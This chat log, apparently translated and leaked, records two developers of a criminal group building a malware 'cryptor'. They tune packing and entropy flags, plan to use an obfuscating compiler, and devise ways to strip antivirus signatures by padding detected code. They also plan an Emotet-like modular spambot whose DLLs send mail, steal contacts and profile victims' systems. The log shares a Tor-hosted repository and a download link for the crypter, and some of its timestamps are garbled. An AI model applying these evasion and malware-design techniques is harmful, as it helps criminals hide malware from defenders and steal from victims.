[08.11.21 11:40:08] elroy: it works
[08.11.21 15:18:47] basil: test
[08.11.21 15:19:06] elroy: so, will you make changes?
[08.11.21 15:19:18] elroy: i++
[08.11.21 15:21:14] basil: I can upload edits. Sure. But they didn't really affect the volume. Or fill them in anyway?
[08.11.21 15:21:44] elroy: No, why, if it's not affected
[08.11.21 15:22:35] basil: I've already obfuscated as little as possible. I've cut everything I could. At least I think so.
[11/11/21 15:23:18] basil: but still about 300 kb of load out of 11 kb. That's if you don't correct entropy.
[08.11.21 15:23:53] elroy: And if you make it not from 11, but from 100 or 300 ?
[08.11.21 15:24:25] basil: I'll try it now, but I have a feeling it won't be enough
[08.11.21 15:24:28] basil: a moment
[08.11.21 15:25:50] elroy: Well, throw the edits in the git. All the same with such sizes it is dead branches.
[08.11.21 15:26:50] basil: now. I'll make a build and report back. And I will make these changes.
[08.11.21 15:27:35] basil: although it may be ok to use template with i++ for additional polymorphism. But the size. Size...
[08.11.21 15:27:53] basil: I don't know how to compress it yet
[08.11.21 15:28:31] elroy: You can also throw out try construct
[08.11.21 15:29:28] elroy: Already did it.)
[08.11.21 15:30:01] basil: so these are the figures. 190 kb load 1.3 mb crypto
[08.11.21 15:30:21] basil: i.e. at least 6 times the size
[08.11.21 15:45:18] elroy: It was like that
[08.11.21 15:45:50] elroy: And if you use the key
```
--pack-prop-xor 77
```
[08.11.21 15:46:26] basil: yeah? But that's all I could cut off. And that's if you don't use entropy correction
[08.11.21 15:46:33] basil: let me try
[08.11.21 15:49:36] basil: 950KB
[08.11.21 15:49:49] basil: 200kb load
[08.11.21 15:50:02] elroy: That's a good number
[08.11.21 15:50:07] elroy: Put it in git
[08.11.21 15:50:10] elroy: I'll test it myself
[08.11.21 15:50:20] basil: uploaded
[08.11.21 15:50:34] basil: last commit with i++
[08.11.21 15:50:56] elroy: ok
[08.11.21 15:51:23] basil: I disabled char* nopWinApiFunc[]. In my opinion, it only interferes with it. At the moment
[08.11.21 15:51:42] elroy: I don't know.)
[08.11.21 15:54:54] basil: I just wanted to warn you beforehand
[08.11.21 15:55:00] basil: I don't insist
[08.11.21 15:55:21] basil: it takes 2 seconds to turn back on
[09.11.21 15:41:52] basil: test
[09.11.21 15:41:58] elroy: test off
[09.11.21 15:42:09] basil: ok. listening
[09.11.21 15:42:09] elroy: busy with mailbot?
[09.11.21 15:42:24] basil: no. it's quiet today.
[09.11.21 15:42:32] basil: what's up with the cryptor?
[09.11.21 15:42:38] basil: any comments?
[09.11.21 15:42:50] elroy: I have a problem
[09.11.21 15:42:57] basil: okay. go ahead.
[09.11.21 15:45:29] elroy: I wish you'd make the last branch with corrections look logical. There's a bunch of fixes there... Or take it to the development then.
We need to check the build of new changes with llvm and llvmo
And also with ollvm 12
```
https://github.com/0x3f97/ollvm-12.x
```
This obfuscating already appeared 12 and somehow passed us by
[09.11.21 15:46:45] elroy: I'm interested in 12 ollvm in the first place.
[09.11.21 15:46:58] elroy: Actually, I wonder if it will give you the purity or not
[09.11.21 15:47:51] basil: ok. About "I should make something else about what you've done, the last branch with the edits, something logical to do?
[09.11.21 15:52:05] elroy: I need the previous commit from the develop top for today, that's what I see as the top. I put the branch where you redid the data representation into the top develop (I don't remember the name of the branch, probably something to do with crt).
That's the commit I'd like to roll back.
To go back to 1.
That branch where I deleted crt, that part where first REpresent fixes appeared, it could be continued with those fixes.
And possibility to use external obfuscator would be put in separate branch from previous wurhushka commit.
[09.11.21 15:52:10] elroy: Save it all...
[09.11.21 15:52:57] elroy: It's so weird the way work is organized now... I have to merge branches on the spot and then crypt them out. Drain the cocktail and then start crypting... Somehow))
[09.11.21 15:53:08] elroy: I need the previous commit from the top develop for today, I see it as the top. I put a branch into the top develop where you redid the data representation (I don't remember the name of the branch, probably something to do with crt).
That's the commit I'd like to roll back.
To go back to 1.
That branch where I deleted crt, that part where first REpresent fixes appeared, it could be continued with those fixes.
And the ability to use external obfuscator would be rolled out into a separate branch from previous vurhushka commit.
Save it all...
[09.11.21 15:53:17] elroy: What I wrote before)
[09.11.21 15:56:01] basil: ok.
[12.11.21 10:40:57] elroy: hello
[12.11.21 10:43:07] basil: I tried to build ollvm these days. Did everything as described on GinHub. You also need to put cmake and pyhon 3.6. A lot of bugs are dropping. So far I haven't seen any end to it. Should I keep trying?
[12.11.21 10:43:33] elroy: No
[12.11.21 10:43:41] elroy: Tidy up the branches.
[12.11.21 10:44:02] basil: now branch by branch.
[12.11.21 10:44:04] basil: moment
[12.11.21 10:44:52] basil: let me download from git
[12.11.21 10:46:45] basil: here it was written to me like this
"I need the previous commit from the develop top for today, that's what I see as the top. I put a branch where you redid the data representation (I don't remember the name of the branch, it must be something about crt) into the top develop.
That's the commit I'd like to roll back.
To go back to 1.
That branch where I deleted crt, that part where first REpresent fixes appeared, it could be continued with those fixes.
And possibility to use external obfuscator would be put in separate branch from previous wurhushka commit."
[12.11.21 10:46:55] basil: need clarification
[12.11.21 10:47:34] elroy: Just a minute...
[12.11.21 10:53:12] elroy: Let's break it down
[12.11.21 10:53:19] elroy: What exactly isn't clear here?
[12.11.21 10:53:52] basil: Well first, how do you roll back one commit from the top?
[12.11.21 10:54:13] basil: there seems to be a way, but commits in the git still kind of stay
[12.11.21 10:54:45] elroy: So let it stay in the git. I don't mind. You rolled back the top of the branch once, I remember)
[12.11.21 10:55:01] basil: I'm going through my stuff
[12.11.21 10:55:08] basil: just have to wait a bit
[12.11.21 10:55:21] elroy: Okay, I'm in no hurry
[12.11.21 10:55:33] elroy: The main thing is not to ruin your git.)
[12.11.21 10:55:40] basil: That's it...
[12.11.21 10:55:44] elroy: Make a backup of yourself with all the branches
[12.11.21 10:55:54] basil: okay.
[12.11.21 10:55:55] elroy: We have to get them all out
[12.11.21 10:56:00] elroy: okay.
[12.11.21 11:02:43] basil: well, according to the idea. I should do it this way.  Then go to the desired branch. Reset locally with --hard key. And then push with the -f switch. As I understand it -f is a force
git checkout develop
git reset --hard <commit needed>
git push -f
[12.11.21 11:03:04] basil: I'll do it and save it locally
[12.11.21 11:03:15] basil: And report the results
[12.11.21 11:06:58] elroy: push -f to server sends
[12.11.21 11:07:09] basil: yeah
[12.11.21 11:07:28] elroy: I mean, I can't do it locally.)
[12.11.21 11:08:31] elroy: You can have another project on the git-server
[12.11.21 11:08:31] basil: we roll back a branch locally. And then we "force" to make this "rollback" on the server
[12.11.21 11:09:43] basil: okay. let's do it that way then. If it's okay then let's do it in the main repository as well. No objections? Or maybe I missed some detail?
[12.11.21 11:10:02] basil: I mean create a new repo
[12.11.21 11:10:41] elroy: Let's do this. Take your time for lunch, I'll carefully make a backup of the project with all its branches for about 40 minutes.
[12.11.21 11:10:46] elroy: And then we'll continue
[12.11.21 11:11:11] basil: Okay.
[12.11.21 11:11:22] basil: Beep me when you can talk
[12.11.21 11:11:42] elroy: okay.
[12.11.21 11:54:00] elroy: I backed up my repo
[12.11.21 11:54:05] elroy: You can go ahead.
[12.11.21 11:54:38] elroy: You can create a project yourself in git, there must be rights
[12.11.21 11:54:45] basil: Okay.
[12.11.21 12:48:13] elroy: Did you know that blake doesn't speak russian? That's why he often writes such rubbish...
[12.11.21 12:48:49] basil: Uh.....
[12.11.21 12:48:59] basil: What a twist!
[12.11.21 12:49:26] basil: if he also has an avatar with his photo - I'll be out!
[12.11.21 12:49:57] elroy: It's ironic that he was given a nickname consonant with black - black.)
[12.11.21 12:50:18] basil: You should have heard me laughing just now.
[12.11.21 12:50:20] basil: )))
[12.11.21 12:50:37] basil: Strong. Someone has a special sense of humor.
[12.11.21 12:51:31] elroy: Yeah. What's interesting is that nicknames are given here at random. Completely random.)
[12.11.21 12:51:57] basil: I'll write elsewhere now.
[12.11.21 12:52:00] basil: moment
[12.11.21 14:21:20] basil: test
[12.11.21 14:21:27] basil: try to download
[12.11.21 14:21:28] elroy: test ok
[12.11.21 14:21:29] basil: https://mb5fbvx72fbod2hkirfecc5nh7lwq6ke7xocn7j2u7raiwbytvevpbad.onion/charlotte/temp_crypter.git
[12.11.21 14:21:42] basil: you're listed as an owner
[12.11.21 14:21:54] basil: branch
[12.11.21 14:22:51] elroy: trying
[12.11.21 14:27:44] elroy: In the test crypto it's on top
```
commit 74a6a4890ce85f45e813748972f347aeca99cc9e (HEAD -> develop, origin/develop)
Author: charlotte <charlotte@charlotte>
Date: Thu Sep 9 19:53:05 2021 +0300

    full_deleted_vector_from_UniCrypterProj
```
[12.11.21 14:28:32] basil: well, yeah. You have to roll it back to a day ago\.
[12.11.21 14:28:38] elroy: I need this
```
SolutionBuilder - changed step payload obfuscation to 120 in Represent UInt64
```
[12.11.21 14:28:49] elroy: One commit back)
[12.11.21 14:29:36] basil: what's the name of the commit
[12.11.21 14:29:38] basil: ?
[12.11.21 14:29:49] basil: full name? It's in the develop& branch.
[12.11.21 14:29:50] basil: ?
[12.11.21 14:30:07] elroy: moment
[12.11.21 14:30:46] elroy: This is a commit comment.
And here's the id.
```
205c06ae872395271eac66f305058c380036604b
```
[12.11.21 14:32:25] basil: There is a request. Please. Can I have the name? Sorry, I'm not very good with these id's.
[12.11.21 14:33:30] elroy: The id is used instead of the title.
A commit has a text, that's what's specified with -m "comment", and then there's an id, which is a number unique to it...
[12.11.21 14:33:44] elroy: Tell me what else to say, I will)
[12.11.21 14:34:39] basil: ok. i'll look up the id
[12.11.21 14:34:49] elroy: ``
F:\projects\crypters\temp_crypter>git show 205c06ae872395271eac66f305058c380036604b
commit 205c06ae872395271eac66f305058c380036604b
Author: laura <laura@example.com>
Date: Thu Sep 9 14:55:20 2021 +0300

    SolutionBuilder - changed step payload obfuscation to 120 in Represent UInt64
```
[12.11.21 14:51:17] basil: no such commit in develop
[12.11.21 14:51:22] basil: no
[12.11.21 14:51:53] basil: it's in other branches
[12.11.21 14:52:19] basil: but which one was it made in
[12.11.21 14:53:35] elroy: It can't be
[12.11.21 14:54:29] basil: from 09.09.2021 only 3 commits in progress
[12.11.21 14:54:45] elroy: Do you have a way to put Guitar ?
[12.11.21 14:55:03] basil: let me try
[12.11.21 14:57:01] basil: yes
[12.11.21 15:11:13] basil: can you find that commit?
[12.11.21 15:11:19] elroy: test ok
[12.11.21 15:11:24] basil: test
[12.11.21 15:11:38] basil: I got something wrong
[12.11.21 15:11:43] elroy: yeah
[12.11.21 15:11:43] elroy: I can.
[12.11.21 15:12:21] basil: i.e. you have it in your develop branch? Do you have it from September 09?
[12.11.21 15:12:43] elroy: yes
[12.11.21 15:12:59] elroy: Let me take a screenshot.)
[12.11.21 15:13:03] elroy: You'll see.
[12.11.21 15:13:18] basil: No screenshot
[12.11.21 15:13:28] basil: I need to understand why I don't have it
[12.11.21 15:13:47] elroy: Did you open it in guitar?
[12.11.21 15:13:51] elroy: There's a graph
[12.11.21 15:15:06] basil: Well, I opened it in guitar. But I use it seldom.
[12.11.21 15:15:25] basil: You don't have it in your studio. Do you have this commit in studio?
[12.11.21 15:15:27] basil: not in guitar
[12.11.21 15:15:46] elroy: I'll have a look
[12.11.21 15:17:12] elroy: Yes, there's a commit
[12.11.21 15:17:40] elroy: There is a filter at the top right, I typed it in, it shows commit
[12.11.21 15:18:42] elroy: Finger in the sky... - maybe it's the git version?
[12.11.21 15:37:23] basil: i might be doing something wrong
[12.11.21 15:37:42] basil: avpv
[12.11.21 15:37:44] basil: test
[12.11.21 15:37:52] basil: test
[12.11.21 15:37:55] elroy: let's do it again.)
[12.11.21 15:37:58] elroy: test okay
[12.11.21 15:38:03] basil: not found
[12.11.21 15:38:08] basil: no such commit
[12.11.21 15:38:12] basil: even with search
[12.11.21 15:38:18] basil: develop branch
[12.11.21 15:38:34] elroy: How did you move that commit to the new git?
[12.11.21 15:39:15] elroy: do
```
git checkout develop
git pull
```
[12.11.21 15:39:23] elroy: What does it say?
[12.11.21 15:41:22] basil: already up to data
[12.11.21 15:41:28] basil: date*
[12.11.21 15:42:57] elroy: git checkout 205c06ae872395271eac66f305058c380036604b
[12.11.21 15:44:44] basil: did
[12.11.21 15:45:24] elroy: So he sees the commit
[12.11.21 15:45:30] elroy: git show
[12.11.21 15:46:12] basil: okay. i'll try to do it all at the command line
[12.11.21 15:52:41] basil: okay. i think i did it at the command line
[12.11.21 15:53:04] elroy: I ran it in a test repo on the server. Like this?
[12.11.21 15:53:42] basil: now.
[12.11.21 15:55:36] basil: check
[12.11.21 15:55:44] basil: sent to server
[12.11.21 16:02:11] elroy: if you reclone, it shows something correct.
[12.11.21 16:02:18] elroy: But you have to check the sorts
[12.11.21 16:02:28] elroy: Do whatever you need to do next in this test repo
[12.11.21 16:02:42] elroy: Then I'll check the sorts by branch
[12.11.21 16:03:44] basil: Okay.
[12.11.21 16:03:52] elroy: If I just do a git pull, it will dump something and show something weird. I just have to clone it again. But it's not a problem) It's better)
[12.11.21 16:04:58] basil: ok. ok.
[12.11.21 16:05:07] basil: Then how do I act now
[12.11.21 16:05:11] basil: ?
[12.11.21 16:08:41] elroy: Can you go on from here?
[12.11.21 16:09:08] elroy: I asked you to parse commits from the branch where the external obfuscator is introduced
[12.11.21 16:09:24] basil: yes. i did. i re-downloaded it.
[12.11.21 16:13:22] elroy: I don't understand the answer...
[12.11.21 16:15:40] basil: I wrote something wrong
[12.11.21 16:22:53] basil: so I read your assignment again. I'm now making a separate branch from the test repo from the develop branch, from its top (which has the SolutionBuilder commit - changed step payload obfuscation to 120 in Represent UInt64).  And in this branch I make external obfuscator, which is called from the command line (noiser.exe). Do I understand you correctly? Somehow I'm confused.
[12.11.21 16:23:21] elroy: Yes
[12.11.21 16:23:58] basil: Okay.
[12.11.21 16:24:05] elroy: Then there's a branch where you cleaned the crt (preparing to clean it), there you need to continue those changes last
[12.11.21 16:24:26] elroy: Which are related to dimensions (Represent was ramping up there)
[11/18/11/21 11:07:00] elroy: Busy?
[18.11.21 11:09:26] elroy: Text me when you get back.
[18.11.21 12:48:01] basil: Greetings.
[11/18/21 12:50:23] elroy: I found OpenAI Codex development, they trained neuronics to write hints to coder by words. On the page there is a video of it writing a game reacting to the developer's English farces
```
https://openai.com/blog/openai-codex/
```
[18.11.21 12:52:47] basil: Okay. Thank you
[26.11.21 11:38:23] basil: Greetings.
[26.11.21 11:39:29] elroy: Greetings.
[11/26/11/21 11:40:22] basil: I need a little help with C++. Can you spare some of your time?
[26.11.21 11:40:42] elroy: I can, but later.
[11/26/11/2011 11:41:05] basil: Ok. Let me know when you can.
[26.11.21 11:41:09] elroy: Okay.
[26.11.21 13:12:25] elroy: Ask away, I think it's getting easier.
[26.11.21 13:13:13] basil: well, I've solved one problem here. The scope was wrong. Then the second question.
[26.11.21 13:13:45] basil: I have a class. The class has properties
[26.11.21 13:14:11] basil: This property has a const modifier
[26.11.21 13:16:18] basil: Is it possible to initialize this property not at the time of declaration. I.e.
const DWORD i=0;
But after some calculations? In the handler it is declared, and in the *.cpp file it is initialized
[26.11.21 13:20:19] elroy: const is a value. Can the value be changed? (no)
You'll use variables instead of constants.
[26.11.21 13:20:27] elroy: (or maybe I don't understand the question)
[26.11.21 13:21:08] basil: no. Value cannot be changed.
[26.11.21 13:21:12] basil: that's the point
[26.11.21 13:21:37] basil: you have to give it a value once and you can't change it any more
[26.11.21 13:22:50] elroy: then a constant is used. Constants are usually declared in .h file or in .cpp if you only have visibility on that .cpp
[26.11.21 13:23:16] elroy: If constant must be computed at compile time, use constexpr
[26.11.21 13:25:30] basil: But if constant must be calculated in runtime, then you can't use constant? In fact, it turns out that only the compiler checks for constant invariance at the compilation stage?
[26.11.21 13:29:59] elroy: The compiler doesn't check for invariance, it just checks the constant and whether you write into it; if you write into it, all is bad.
When generating code constant is not always put on memory page rdata as a constant, it can be substituted directly in the instructions. It simply can't be changed in any way, that's why.
If you only need to change it once at program start, just a variable.
If you want to control that nobody writes there, then it's a class with overridden assignment operator
[26.11.21 13:31:09] elroy: But the class is for code checks, if someone writes in the patch, nothing else helps here)
[26.11.21 13:31:41] basil: ok. thank you. the advice is exhaustive)))
[26.11.21 13:31:48] elroy: ))
[03.12.21 13:01:21] basil: hello
[03.12.21 13:01:33] elroy: Greetings.
[03.12.21 13:02:19] basil: Listen, is there anything to do on crypto now? Is there anything I can do to help? a few switch MAPI it's already bored to death
[03.12.21 13:02:53] basil: I have my hand on the bot
[03/12/21 13:04:42] elroy: Not yet. Take a break, have some tea, take a walk in the air.....
[12/13/21 13:05:03] basil: okay. okay.
[10.12.21 13:37:24] basil: i'll just type it in my notebook.
[10.12.21 13:39:47] elroy: Write again.
[10.12.21 13:39:58] basil: test
[10.12.21 13:40:10] basil: test
[10.12.21 13:40:10] elroy: Write again.
[10.12.21 13:40:22] basil: that's better
[10.12.21 13:42:12] basil: started redesigning the project according to the customer's wishes. With account switching everything seems to work more or less so far. But here, let's say, with "architectural peculiarities" are complex
[10.12.21 13:42:47] basil: there are several base classes with virtual methods in the project
[10.12.21 13:45:15] basil: the complexity is in the OutlookBase class. So each of the OutlookClient, OutLookSender, OutlookGrabber descendants creates one additional instance of OutlookBase. In this class there is a variable storing MAPI session
[10.12.21 13:46:30] basil: It all creaks and crunches periodically. I think it may be because of this session. I have a suggestion to make this OutlookBase class static.
[10.12.21 13:46:50] basil: What do you think about this suggestion?
[10.12.21 13:47:45] basil: or maybe it can be solved by some other less radical methods?
[10.12.21 13:55:52] elroy: make the variable static if there is only one outlook
[10.12.21 13:56:25] basil: ok
[12/13/21 10:29:56] basil: hello
[12/13/21 10:30:57] basil: Listen, tell me if you know. Who does virtual machines. I got jefferson allocated one here. I need to contact the administrator. Check with him about something.
[12/13/221 10:34:23] elroy: Hello. I'm on to gator.
[12/13/21 21 10:34:39] basil: Thank you.
[12/23/221 16:25:37] basil: Hello.
[12/23/221 16:26:07] elroy: Hello.
[23.12.21 16:27:12] basil: Could you please tell me what parameters of entropy are set for RunDll load
[23.12.21 16:27:26] basil: Preferably a line for the build
[12/23/221 16:27:40] basil: I can't access Jenkins - not available
[12/23/221 16:27:47] elroy: --entropy-max-rdata
[12/23/221 16:27:56] elroy: 4 to 6
[12/23/221 16:28:00] elroy: 4.1
[12/23/221 16:28:07] elroy: 4.6
[12/23/221 16:28:09] elroy: .....
[12/23/221 16:28:13] basil: ok
[23.12.21 16:28:19] basil: thanks a lot
[24.12.21 14:15:39] elroy: greetings
[24.12.21 14:16:22] elroy: yesterday I asked you about parameters for crypt
[12/24/21 14:16:31] basil: Yes.
[24.12.21 14:16:32] elroy: Someone wrote to you for crypto?
[24.12.21 14:16:38] basil: for
[24.12.21 14:16:42] basil: wild
[24.12.21 14:16:49] basil: yes
[12/24/21 14:16:57] elroy: okay, fine.
[12/24/21 14:17:13] basil: I shouldn't have done that?
[12/24/21 14:17:13] elroy: If you happen to do any commits, don't poosh in the git.
[24.12.21 14:17:26] basil: ok. whatever you say.
[24.12.21 14:17:27] elroy: I have to) Thanks for doing that.)
[12/24/21 14:17:41] basil: okay.
[12/30/21 09:58:27] basil: Greetings.
[30.12.21 09:58:59] basil: I'm trying to connect to a repository with a cryptor here
[30.12.21 09:59:09] basil: Does it work at all?
[12/30/21 09:59:10] elroy: It doesn't work, it's gone
[30.12.21 09:59:29] basil: Did they kill him?
[30.12.21 09:59:35] elroy: Yes.
[30.12.21 09:59:36] basil: You mean they erased him?
[12/30/21 9:59:41] elroy: Yes.
[12/30/21 10:00:00] basil: Okay. So how does one get access to the repo now?
[30.12.21 10:00:05] elroy: I'll send you the latest version of the project
[12/30/21 10:09:50] elroy: ```
Download: https://qaz.im/load/66hTrz/DKZhze
Delete: https://qaz.im/index.php?a=delete&q=1438029721
```
[30.12.21 10:10:55] basil: test
[12/30/221 10:11:54] elroy: Build --stub 4 - if the build goes under 2022 studio.
There's just one nuance there, built crypts sometimes don't work. And I still do not understand why. Either studio 22 builds that, or we have a bug somewhere
[12/30/21 10:12:21] basil: ok
[12/30/21/12:07:38] basil: test
[30.12.21 12:08:19] basil: for et build standard?
[30.12.21 12:08:32] basil: or are there any specific keys?
[30.12.21 12:09:09] elroy: --gen-exports yes is required, as well as for everything where you need to route
[30.12.21 12:09:23] elroy: So nothing special is needed
[12/30/221 12:09:45] elroy: There's a problem, we have a cryptor doing et that doesn't work for them.
[30.12.21 12:10:07] elroy: et can not crypt, it's useless... but you can try.
[12/30/21 12:10:09] basil: they have.... What if you run it on your own?
[30.12.21 12:10:16] elroy: There's a profile et...
[30.12.21 12:10:20] basil: tried it?
[30.12.21 12:10:21] elroy: The dummy works.
[30.12.21 12:10:25] basil: I saw
[30.12.21 12:10:39] elroy: The dummy works, but their load does not.
[30.12.21 12:10:46] elroy: I do not recommend to run it on my computer.
[30.12.21 12:10:51] elroy: Careful)))
[30.12.21 12:10:59] basil: no. not on me
[30.12.21 12:11:05] basil: there's a test machine
[30.12.21 12:11:08] basil: allocated
[30.12.21 12:11:44] elroy: Try it
[30.12.21 12:11:54] elroy: All the specifics are set up in the profile
[06.01.22 10:58:46] elroy: Hello
[06.01.22 10:58:57] basil: Hello
[06.01.22 10:59:00] basil: test
[06.01.22 10:59:14] elroy: Say, are there any tasks by mailer?
[06.01.22 11:00:22] basil: well, yesterday I showed a customer how it works. I think he was satisfied. There's some new vision of its development. But so far at the level of talk.
[06.01.22 11:00:29] basil: Do you need my help?
[06.01.22 11:00:36] basil: If you do, I will.
[06.01.22 11:00:54] elroy: I need to know if you're busy or not, if you have tasks
[06.01.22 11:01:09] basil: not right now. Free
[06.01.22 11:01:27] elroy: Busy tomorrow?
[06.01.22 11:01:45] basil: Well, I guess not. Also free.
[06.01.22 11:01:59] basil: relatively of course
[06.01.22 11:02:46] elroy: Check with the customer whether they need you tomorrow or not. If not, take advantage of the free schedule. Bilds restored, there will be no tasks on crypts.
[06.01.22 11:03:22] elroy: (just a recommendation)
[06.01.22 11:05:13] basil: I'm sorry, of course. But somewhat did not understand what I should do. They give me such a peculiar "day off". Or what? I'm not excusing myself, I just don't get it. Please rephrase. If you can.
[06.01.22 11:08:30] elroy: By order of Silver back in December, those who are not involved in working with partners (on whom the work does not depend) and those who have long-running projects (development), they can be free.
In this case, had to work from 31 to 7, as needed to make crypts. Bilds restored, and here you are no longer involved (not yet). If you are not involved there, too, it is advisable to use svobodnoy schedule.
[06.01.22 11:09:09] basil: ok. Got it)))
[06.01.22 11:09:26] basil: Well, it just became clearer.
[06.01.22 11:10:02] elroy: If you want to work, work... Just suddenly you need a rest.
[06.01.22 11:10:19] basil: no. i'm fine.
[06.01.22 11:10:56] elroy: Anyway, I was just making a point. I do not give a day off (bosses will not appreciate), but the "free schedule" is different)))
[06.01.22 11:11:11] basil: )))
[06.01.22 11:11:21] basil: The sun is still high)))
[06.01.22 11:11:32] basil: Cotton field is big
[06.01.22 11:11:36] elroy: I haven't had it for a long time...
[06.01.22 11:11:53] elroy: And a field in snow...
[06.01.22 11:11:59] elroy: No possibility to work))))
[06.01.22 11:13:09] basil: Listen. Here's the thing. How should I say it. I need your technical advice.... I'm not talking on my own behalf. From jefferson.
[06.01.22 11:14:05] basil: Actually the customer really wants to make an analogue of emotet. From the bot that is now.
[06.01.22 11:14:13] basil: passion
[06.01.22 11:14:57] basil: I tried to learn something about it (emotet). As I understand it has a modular design. All of this economy.
[06.01.22 11:17:43] basil: I told him that in principle it's possible. I think we have a dll loader. There shouldn't be any problems with it. So it seems to me. So here's.... What is the actual question. Is there any fundamental problem in this idea, which will not allow to release the idea?
[06.01.22 11:18:09] basil: made a lot of typos. Shit.
[06.01.22 11:19:24] elroy: I understood the point, despite the typos. But I didn't understand the question, probably not enough information. Specify what kind of modularity, what exactly does he want? Project as a dll - yes, break the spambot into blocks as a dll - yes...
[06.01.22 11:19:30] elroy: Or do you need something else?)
[06.01.22 11:20:04] basil: Break spam bot into dll blocks
[06.01.22 11:20:11] basil: I got it
[06.01.22 11:20:44] basil: One would only do mailing, the other only rob contacts
[06.01.22 11:20:51] basil: the third one was only collecting information about the system and so on
[06.01.22 11:21:04] basil: And there's more
[06.01.22 11:21:21] basil: now the spambot is cross-digit
[06.01.22 11:21:51] basil: But it does it so only by injecting code into 64 bit process.
[06.01.22 11:24:27] basil: So there is a release when we from WoW64 appeal to 64 bit windows subsystem. I have it working on an OS older than win7.  Win7 has some issues. Could you take a quick look at it. What's wrong there is the essence of the problem is clear. It is not clear how to solve it - how to bypass
[06.01.22 11:25:18] elroy: There's no way around it... You have to get into debugging.
[06.01.22 11:26:43] elroy: The point is that it doesn't work on vin7, or there is something else known, for example, what's the difference?)
Maybe it's missing some function? Would check used on msdn, there you can see the minimum requirements for the function
[06.01.22 11:28:34] basil: no . everything is enough there. Okay, that's my problem. I'll solve it myself. You must have your own worries.
[06.01.22 11:29:01] elroy: The piece of code I threw at you which lets you holovate on a 32x 64x bit, it was tested on win7, it worked there. I.e. holoving itself works. Probably does not find some function on win7 in the library
[06.01.22 11:30:04] basil: I have no complaints about the holoving. It works perfectly. You could even say, "with flying colors.
[06.01.22 11:30:26] basil: ok. Thank you.
[06.01.22 11:30:55] elroy: Add a debug line to GetApi, where the function is searched. If it doesn't find it, you'll just see)
[06.01.22 11:31:13] basil: ok
[12.01.22 13:16:48] basil: test
[12.01.22 13:16:54] basil: great
[12.01.22 13:17:04] basil: The question is
[12.01.22 13:19:22] basil: There's a utility like objconv (object converter). It translates binary file into assembly code. Not without errors, but their number is not infinite (you can correct it manually). I tried the same operation with Ida pro, but there are too many errors and no end in sight. So here's....
[12.01.22 13:19:38] basil: What is the question
[12.01.22 13:25:09] basil: The question is (in your opinion). Is it possible to implement such a paradigm.
We write a program in c/s++ (for example the same crypter). Compile it. Translate the binary to assembly language code. And build it again with the same MASM. Why all these operations. I would like to try something to automate the cleaning process. I.e. we take the assembled binary from assembly litzing. Checked on AV. The detection is localized. Then in the assembler code the singnature is split by "idle code".
NOP
or for example
push EAX
pop EAX.
and the binary and clean binary is reassembled.
How do you think "theoretical" possible to reactivate all this in practice is. Or the game is not worth the candle.
[12.01.22 13:25:48] basil: possibility*.
[12.01.22 13:29:33] elroy: The game is worth any candle.)
What you write - yes, it's possible, but complicated.
Why make everything so complicated...
Nowadays shellcode is practiced, it takes little space and it's attached to any ready-made exe. That's what Silver was originally talking about.
Your version I would simplify. I would compile from .lib - static libraries and change these libraries.
That is, the program would be broken into libraries, and then these libraries would be assembled to a bunch by another compiler. But I'm talking about static libraries.
[12.01.22 13:30:42] basil: ok. thanks. My spirits are high.
[12.01.22 13:30:46] basil: really)))
[12.01.22 13:31:39] elroy: You can already edit this library on a higher level. I get your idea about automation. You want it to find and rewrite a fragment automatically.
[12.01.22 13:31:52] basil: well, yeah
[12.01.22 13:32:03] basil: cleaning takes a lot of effort
[12.01.22 13:32:14] basil: too much trouble
[12.01.22 13:35:13] elroy: You can rewrite high-level code too, it's easier... Or you can fight the patch yourself. In terms of synthesizing the necessary instructions yourself. Unpack and synthesize new ones. Just to write a thing which writes code in asm which then compiles is more difficult than to read and replace the instruction in bytes yourself. Ida has tab sync, it's very handy) Synchronize tab of asm and tab of hex, highlight command with mouse, bytes are visible. Parsing them backwards is much easier than reading/writing assembly code (the code itself)
[12.01.22 13:35:50] elroy: In general, you should try the idea with static libraries and collect them with llvmo
[12.01.22 13:36:09] elroy: 12 llvmo came out, it's quite interesting))
[12.01.22 13:36:30] basil: well, I know the reception with tab synchronization. That's exactly what I'm looking for.
[12.01.22 13:36:34] basil: detects
[12.01.22 13:36:34] elroy: building with lvmo automates the process you invented)
[12.01.22 13:38:01] basil: To be honest with llvm is not quite clear. Pardon me, but it's not clear. Could you elaborate a bit more. If you can, of course. Or link, if any.
[12.01.22 13:39:06] elroy: There's llvm and then there's llvmo, which is an obfuscating compiler. It takes your C++ code and compiles differently each time.
[12.01.22 13:39:10] elroy: I'll give you a link
[12.01.22 13:39:18] basil: waiting
[01/13/222 12:04:09] elroy: Yes. Okay. Let it work))
[13.01.22 12:05:02] basil: And I'll add that I changed entropy for all sections\.
[19.01.22 12:17:21] basil: Greetings.
[19.01.22 12:17:56] basil: test
[19.01.22 12:18:22] elroy: otp?
[19.01.22 12:18:33] basil: yes
[19.01.22 12:18:40] basil: test
[19.01.22 12:18:46] basil: oh great
[19.01.22 12:19:39] basil: there was a message in the chat that you can kill the traffic which is not coming through VPN.  Maybe you can send me some links to read
[19.01.22 12:19:41] basil: ?
[19.01.22 12:21:06] elroy: I will not send you the link. It's not described somehow, I have to look it up.
The idea is that we run linux on VM, minimal content usually, with iptables and small stuff to taste (including openvpn and tor for example).
[19.01.22 12:21:27] elroy: Let the internet in on the machine, any way you like, but past the system.
[19.01.22 12:21:58] elroy: And to the system and to all other VMs the Internet is distributed through this VM (router).
[19.01.22 12:22:09] elroy: Setting up iptables there...
[19.01.22 12:22:19] elroy: That's the way
[19.01.22 12:22:45] elroy: you can read the official Gentu, for example, or Arch
[19.01.22 12:23:31] elroy: Gentu has "home router" article (in the manual), it says how to. But there's a gross error in the firewall settings))
[19.01.22 12:24:16] basil: If you can download it, I would like to see how it can be done. At least in theory.
[19.01.22 12:24:34] elroy: Discount what?)
[19.01.22 12:24:43] elroy: I can send you iptables settings.
[19.01.22 12:24:51] elroy: Everything else is standard...
[19.01.22 12:26:19] elroy: First, read Gentu handbook, there are instructions on how to install the system. Follow instructions.
[19.01.22 12:26:23] elroy: It describes the minimum
[19.01.22 12:26:26] elroy: Then we'll continue.
[19.01.22 12:26:33] basil: Gentoo is it a Linux build?
[19.01.22 12:26:55] basil: I thought it was an "author" from the internets
[19.01.22 12:27:18] elroy: This is a linux operating system. It's source based, built from source code only, completely, no proprietary
[19.01.22 12:28:11] basil: now I see)))
[19.01.22 12:28:49] elroy: It's even in Russian)))
[19.01.22 12:29:26] elroy: you can go a simpler way, if it's complicated and new something...
[19.01.22 12:29:37] elroy: You can put a router, configure it for yourself
